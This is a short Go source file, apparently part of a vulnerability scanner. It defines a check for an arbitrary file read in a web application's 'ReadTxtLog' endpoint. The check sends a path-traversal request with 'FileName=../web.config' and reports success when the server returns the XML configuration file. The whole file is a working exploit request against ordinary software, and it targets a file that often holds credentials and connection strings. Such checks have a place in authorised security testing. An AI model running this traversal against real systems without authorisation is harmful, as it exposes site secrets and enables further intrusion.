package vulList

import (
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"strings"
)

func ReadTxtLogCheck(target string) error {
	baseurl := target + "BaseModule/SysLog/ReadTxtLog?FileName=../web.config"
	resp, err := http.Get(baseurl)
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}

	defer resp.Body.Close()

	Body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Error reading response body: %v", err)
	}
	responseBody := string(Body)
	if strings.Contains(responseBody, `<?xml version="1.0" encoding="utf-8"?>`) {
		green := color.New(color.FgGreen)
		green.Println("[+]ReadTxtLog arbitrary file read vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-]ReadTxtLog arbitrary file read vulnerability")
		fmt.Println()
	}

	return nil
}
